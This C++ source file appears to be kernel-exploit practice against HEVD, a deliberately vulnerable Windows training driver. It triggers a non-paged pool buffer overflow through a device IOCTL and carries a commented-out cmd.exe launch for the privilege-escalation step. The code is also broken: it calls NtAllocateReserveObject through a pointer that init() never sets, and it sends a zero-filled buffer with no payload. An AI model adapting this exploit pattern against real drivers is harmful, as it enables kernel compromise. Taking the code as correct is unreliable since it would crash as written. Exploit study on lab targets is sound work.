#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include "../HEVDExploit/helper.h"

typedef DWORD(WINAPI* _NtAllocateReserveObject)(HANDLE, PVOID, DWORD);
_NtAllocateReserveObject NtAllocateReserveObject; 

int init() {
	HMODULE modNtDll = GetModuleHandle(L"ntdll.dll");
	if (!modNtDll) {
		printf("Failed to get module handle for ntdll.dll, Error=0x%.8x\n", GetLastError());
		return -1;
	}
	NtAllocateReserveObject = (_NtAllocateReserveObject)GetProcAddress(modNtDll, "NtAllocateReserveObject");
}

int main() {
	HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_WRITE, FILE_SHARE_WRITE,
		nullptr, OPEN_EXISTING, 0,
		nullptr
	);
	if (hDevice == INVALID_HANDLE_VALUE) {
		return printf("Failed to open device");
	}

	ULONG64* payload = (ULONG64*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
	if (payload == NULL) {
		printf("HeapAlloc failed");
		return -1;
	}

	HMODULE modNtDll = GetModuleHandle(L"ntdll.dll");
	if (!modNtDll) {
		printf("Failed to get module handle for ntdll.dll, Error=0x%.8x\n", GetLastError());
		return -1;
	}

	NtAllocateReserveObject(NULL, FALSE, FALSE);
	
	DWORD returned;
	printf("UerBuffer = %p", payload);
	BOOL success = DeviceIoControl(hDevice,
		HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL,
		payload, 0x190,
		nullptr, 0,
		&returned, nullptr
	);

	if (success) {
		printf("Heap Overflow triggered");
		/*
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi;
		CreateProcess(NULL,(LPWSTR)"C:\\Windows\\System32\\cmd.exe",NULL, NULL, false, NULL, NULL, NULL, &si, &pi);		
		*/
	}
	else
		printf("Failed");

	CloseHandle(hDevice);
	HeapFree(GetProcessHeap(),NULL, payload);

	return 0;
}